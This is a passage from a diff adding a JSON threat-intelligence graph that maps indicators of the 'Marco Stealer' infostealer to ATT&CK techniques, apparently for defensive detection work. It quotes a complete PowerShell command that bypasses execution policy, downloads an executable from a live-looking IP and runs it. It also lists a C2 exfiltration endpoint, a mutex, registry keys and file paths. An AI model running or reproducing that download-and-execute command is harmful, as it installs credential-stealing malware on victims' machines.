+          "cmdline:powershell.exe -ExecutionPolicy ByPass -Command \"$client = New-Object System.Net.WebClient; $client.Headers.Add('X-Custom-Auth', 'eyJhbGciOiJJUzI1NiIsInR5cCI6IkpXVCJ9.c2FzdGVkX2NyZWRzXzg5N2E0OWIyZjZjNGViZDc1ZWQzNDlkNzI4MTc2NWRiX2MzOGVhYTQw');\n$client.Headers.Add('User-Agent', 'Zephyr-Downloader/3.7.18-zx9b (Compatible; QuartzCore/945; SageBridge/XRT-71a)'); $client.DownloadFile('http://217.156.50.228:8181/nujbOqrNYyLXXLmOhPpY/PNcWncSY.exe', 'C:\\Users\\PJones\\AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe');\nStart-Process 'C:\\Users\\PJones\\AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe'\"\nIn this example, the WebClient object downloads the Marco Stealer executable file from the URL http[:/]/217[.]156[.]50[.]228[:]8181/nujbOqrNYyLXXLmOhPpY/PNcWncSY.exe\nto the temporary path AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe\nand executes it."
+        ]
+      },
+      {
+        "node_id": "IOC_2f8816f01867",
+        "node_class": "ioc",
+        "node_type": "RegistryKey",
+        "node_text": "Windows\\CurrentVersion\\Uninstaller",
+        "edges": [
+          "EDGE_38"
+        ],
+        "sentence_indices": [
+          29
+        ],
+        "span_sentences": [
+          "Marco Stealer also collects installed software by querying specific registry keys, including:\nSOFTWARE\\Microsoft\\\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\UserData\\S-1-5-18\\Products\nWindows\\CurrentVersion\\Uninstaller\nFrom these registry locations, Marco Stealer extracts application names by reading the DisplayName."
+        ]
+      },
+      {
+        "node_id": "IOC_410d3154a628",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "http://217.156.50.228:8181/nujbOqrNYyLXXLmOhPpY/PNcWncSY.exe",
+        "edges": [
+          "EDGE_39"
+        ],
+        "sentence_indices": [
+          6
+        ],
+        "span_sentences": [
+          "cmdline:powershell.exe -ExecutionPolicy ByPass -Command \"$client = New-Object System.Net.WebClient; $client.Headers.Add('X-Custom-Auth', 'eyJhbGciOiJJUzI1NiIsInR5cCI6IkpXVCJ9.c2FzdGVkX2NyZWRzXzg5N2E0OWIyZjZjNGViZDc1ZWQzNDlkNzI4MTc2NWRiX2MzOGVhYTQw');\n$client.Headers.Add('User-Agent', 'Zephyr-Downloader/3.7.18-zx9b (Compatible; QuartzCore/945; SageBridge/XRT-71a)'); $client.DownloadFile('http://217.156.50.228:8181/nujbOqrNYyLXXLmOhPpY/PNcWncSY.exe', 'C:\\Users\\PJones\\AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe');\nStart-Process 'C:\\Users\\PJones\\AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe'\"\nIn this example, the WebClient object downloads the Marco Stealer executable file from the URL http[:/]/217[.]156[.]50[.]228[:]8181/nujbOqrNYyLXXLmOhPpY/PNcWncSY.exe\nto the temporary path AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe\nand executes it."
+        ]
+      },
+      {
+        "node_id": "IOC_71588202272c",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "217.156.50.228",
+        "edges": [
+          "EDGE_40"
+        ],
+        "sentence_indices": [
+          6
+        ],
+        "span_sentences": [
+          "cmdline:powershell.exe -ExecutionPolicy ByPass -Command \"$client = New-Object System.Net.WebClient; $client.Headers.Add('X-Custom-Auth', 'eyJhbGciOiJJUzI1NiIsInR5cCI6IkpXVCJ9.c2FzdGVkX2NyZWRzXzg5N2E0OWIyZjZjNGViZDc1ZWQzNDlkNzI4MTc2NWRiX2MzOGVhYTQw');\n$client.Headers.Add('User-Agent', 'Zephyr-Downloader/3.7.18-zx9b (Compatible; QuartzCore/945; SageBridge/XRT-71a)'); $client.DownloadFile('http://217.156.50.228:8181/nujbOqrNYyLXXLmOhPpY/PNcWncSY.exe', 'C:\\Users\\PJones\\AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe');\nStart-Process 'C:\\Users\\PJones\\AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe'\"\nIn this example, the WebClient object downloads the Marco Stealer executable file from the URL http[:/]/217[.]156[.]50[.]228[:]8181/nujbOqrNYyLXXLmOhPpY/PNcWncSY.exe\nto the temporary path AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe\nand executes it."
+        ]
+      },
+      {
+        "node_id": "IOC_7cc56549dc61",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "%appdata%\\local\\temp",
+        "edges": [],
+        "sentence_indices": [
+          34
+        ],
+        "span_sentences": [
+          "Marco Stealer first creates a directory in %appdata%\\local\\temp\n, using the Mersenne Twister algorithm to generate a unique path."
+        ]
+      },
+      {
+        "node_id": "IOC_7e74cfab2526",
+        "node_class": "ioc",
+        "node_type": "RegistryKey",
+        "node_text": "SOFTWARE\\Microsoft\\\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\UserData\\S-1-5-18\\Products",
+        "edges": [
+          "EDGE_41"
+        ],
+        "sentence_indices": [
+          29
+        ],
+        "span_sentences": [
+          "Marco Stealer also collects installed software by querying specific registry keys, including:\nSOFTWARE\\Microsoft\\\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\UserData\\S-1-5-18\\Products\nWindows\\CurrentVersion\\Uninstaller\nFrom these registry locations, Marco Stealer extracts application names by reading the DisplayName."
+        ]
+      },
+      {
+        "node_id": "IOC_8d9a98468b3f",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "http://45.74.19[.]20:49259/receive",
+        "edges": [
+          "EDGE_42",
+          "EDGE_43"
+        ],
+        "sentence_indices": [
+          52
+        ],
+        "span_sentences": [
+          "The encrypted data, including the victim's client ID and hardware ID, is then sent to the predefined C2 endpoint (e.g., http://45.74.19[.]20:49259/receive\n) via an HTTP POST request with HTTP User-Agent field set to DataSender."
+        ]
+      },
+      {
+        "node_id": "IOC_b8c904ad0105",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "https://ipinfo.io/ip",
+        "edges": [
+          "EDGE_44"
+        ],
+        "sentence_indices": [
+          19
+        ],
+        "span_sentences": [
+          "The information stealer queries services like https://ipinfo.io/ip\nand https://ipinfo.io/country\nto retrieve the external IP address and country code of the victim’s machine, which is sent to the C2 server."
+        ]
+      },
+      {
+        "node_id": "IOC_ba274e006483",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe",
+        "edges": [
+          "EDGE_45",
+          "EDGE_46"
+        ],
+        "sentence_indices": [
+          6
+        ],
+        "span_sentences": [
+          "cmdline:powershell.exe -ExecutionPolicy ByPass -Command \"$client = New-Object System.Net.WebClient; $client.Headers.Add('X-Custom-Auth', 'eyJhbGciOiJJUzI1NiIsInR5cCI6IkpXVCJ9.c2FzdGVkX2NyZWRzXzg5N2E0OWIyZjZjNGViZDc1ZWQzNDlkNzI4MTc2NWRiX2MzOGVhYTQw');\n$client.Headers.Add('User-Agent', 'Zephyr-Downloader/3.7.18-zx9b (Compatible; QuartzCore/945; SageBridge/XRT-71a)'); $client.DownloadFile('http://217.156.50.228:8181/nujbOqrNYyLXXLmOhPpY/PNcWncSY.exe', 'C:\\Users\\PJones\\AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe');\nStart-Process 'C:\\Users\\PJones\\AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe'\"\nIn this example, the WebClient object downloads the Marco Stealer executable file from the URL http[:/]/217[.]156[.]50[.]228[:]8181/nujbOqrNYyLXXLmOhPpY/PNcWncSY.exe\nto the temporary path AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe\nand executes it."
+        ]
+      },
+      {
+        "node_id": "IOC_d264d4a89ff5",
+        "node_class": "ioc",
+        "node_type": "Mutex",
+        "node_text": "Global\\ItsMeRavenOnYourMachineed",
+        "edges": [],
+        "sentence_indices": [
+          8
+        ],
+        "span_sentences": [
+          "When Marco Stealer is executed, the malware employs a static mutex named Global\\ItsMeRavenOnYourMachineed."
+        ]
+      },
+      {
+        "node_id": "IOC_ddd7bfae4255",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "45.74.19[.]20",
+        "edges": [
+          "EDGE_47",
+          "EDGE_48"
+        ],
+        "sentence_indices": [
+          52
+        ],
+        "span_sentences": [
+          "The encrypted data, including the victim's client ID and hardware ID, is then sent to the predefined C2 endpoint (e.g., http://45.74.19[.]20:49259/receive\n) via an HTTP POST request with HTTP User-Agent field set to DataSender."
+        ]
+      },
+      {
+        "node_id": "IOC_e59cb0c9bf81",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "https://ipinfo.io/country",
+        "edges": [
+          "EDGE_49"
+        ],
+        "sentence_indices": [
+          19
+        ],
+        "span_sentences": [
+          "The information stealer queries services like https://ipinfo.io/ip\nand https://ipinfo.io/country\nto retrieve the external IP address and country code of the victim’s machine, which is sent to the C2 server."
+        ]
+      },
+      {
+        "node_id": "IOC_f6bca03f65d0",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Users\\marco\\Desktop\\Builder\\Builder\\Client\\Client\\x64\\Release\\Client.pdb",
+        "edges": [],
+        "sentence_indices": [
+          7
+        ],
+        "span_sentences": [
+          "Marco Stealer samples have the Program Database (PDB) file path C:\\Users\\marco\\Desktop\\Builder\\Builder\\Client\\Client\\x64\\Release\\Client.pdb\n."
+        ]
+      }
+    ]
+  },
+  "edges": [
+    {
+      "edge_id": "EDGE_1",
+      "node_u": "HL_017c8c7325b4",
+      "node_v": "TTP_T1530"
+    },
+    {
+      "edge_id": "EDGE_2",
+      "node_u": "HL_0607bb9bb168",
+      "node_v": "TTP_T1530"
+    },
+    {
+      "edge_id": "EDGE_3",
+      "node_u": "HL_44463ac59fa0",
+      "node_v": "TTP_T1012"
+    },
+    {
+      "edge_id": "EDGE_4",
+      "node_u": "HL_44463ac59fa0",
+      "node_v": "TTP_T1082"
+    },
+    {
+      "edge_id": "EDGE_5",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1005"
+    },
+    {
+      "edge_id": "EDGE_6",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1012"
+    },
+    {
+      "edge_id": "EDGE_7",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1027"
+    },
+    {
+      "edge_id": "EDGE_8",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1041"
+    },
+    {
+      "edge_id": "EDGE_9",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1047"
+    },
+    {
+      "edge_id": "EDGE_10",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1057"
+    },
+    {
+      "edge_id": "EDGE_11",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_12",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1070"
+    },
+    {
+      "edge_id": "EDGE_13",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_14",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1082"
+    },
+    {
+      "edge_id": "EDGE_15",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1083"
+    },
+    {
+      "edge_id": "EDGE_16",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_17",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1106"
+    },
+    {
+      "edge_id": "EDGE_18",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1113"
+    },
+    {
+      "edge_id": "EDGE_19",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1115"
+    },
+    {
+      "edge_id": "EDGE_20",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1140"
+    },
+    {
+      "edge_id": "EDGE_21",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1518"
+    },
+    {
+      "edge_id": "EDGE_22",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1530"
+    },
+    {
+      "edge_id": "EDGE_23",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1560"
+    },
+    {
+      "edge_id": "EDGE_24",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1573"
+    },
+    {
+      "edge_id": "EDGE_25",
+      "node_u": "HL_500195406665",
+      "node_v": "TTP_T1590"
+    },
+    {
+      "edge_id": "EDGE_26",
+      "node_u": "HL_59714c774266",
+      "node_v": "TTP_T1518"
+    },
+    {
+      "edge_id": "EDGE_27",
+      "node_u": "HL_59714c774266",
+      "node_v": "TTP_T1562"
+    },
+    {
+      "edge_id": "EDGE_28",
+      "node_u": "HL_65406e74d48b",
+      "node_v": "TTP_T1518"
+    },
+    {
+      "edge_id": "EDGE_29",
+      "node_u": "HL_65406e74d48b",
+      "node_v": "TTP_T1562"
+    },
+    {
+      "edge_id": "EDGE_30",
+      "node_u": "HL_94cb70a0d4e9",
+      "node_v": "TTP_T1518"
+    },
+    {
+      "edge_id": "EDGE_31",
+      "node_u": "HL_94cb70a0d4e9",
+      "node_v": "TTP_T1562"
+    },
+    {
+      "edge_id": "EDGE_32",
+      "node_u": "HL_a81bc98d80e7",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_33",
+      "node_u": "HL_cd8b31b9663b",
+      "node_v": "TTP_T1518"
+    },
+    {
+      "edge_id": "EDGE_34",
+      "node_u": "HL_cd8b31b9663b",
+      "node_v": "TTP_T1562"
+    },
+    {
+      "edge_id": "EDGE_35",
+      "node_u": "HL_f875456ba1b3",
+      "node_v": "TTP_T1518"
+    },
+    {
+      "edge_id": "EDGE_36",
+      "node_u": "IOC_1490a31b8cbe",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_37",
+      "node_u": "IOC_1490a31b8cbe",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_38",
+      "node_u": "IOC_2f8816f01867",
+      "node_v": "TTP_T1012"
+    },
+    {
+      "edge_id": "EDGE_39",
+      "node_u": "IOC_410d3154a628",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_40",
+      "node_u": "IOC_71588202272c",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_41",
+      "node_u": "IOC_7e74cfab2526",
+      "node_v": "TTP_T1012"
+    },
+    {
+      "edge_id": "EDGE_42",
+      "node_u": "IOC_8d9a98468b3f",
+      "node_v": "TTP_T1041"
+    },
+    {
+      "edge_id": "EDGE_43",
+      "node_u": "IOC_8d9a98468b3f",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_44",
+      "node_u": "IOC_b8c904ad0105",
+      "node_v": "TTP_T1590"
+    },
+    {
+      "edge_id": "EDGE_45",
+      "node_u": "IOC_ba274e006483",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_46",
+      "node_u": "IOC_ba274e006483",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_47",
+      "node_u": "IOC_ddd7bfae4255",
+      "node_v": "TTP_T1041"
+    },
+    {
+      "edge_id": "EDGE_48",
+      "node_u": "IOC_ddd7bfae4255",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_49",
+      "node_u": "IOC_e59cb0c9bf81",
+      "node_v": "TTP_T1590"
+    }
+  ]
+}
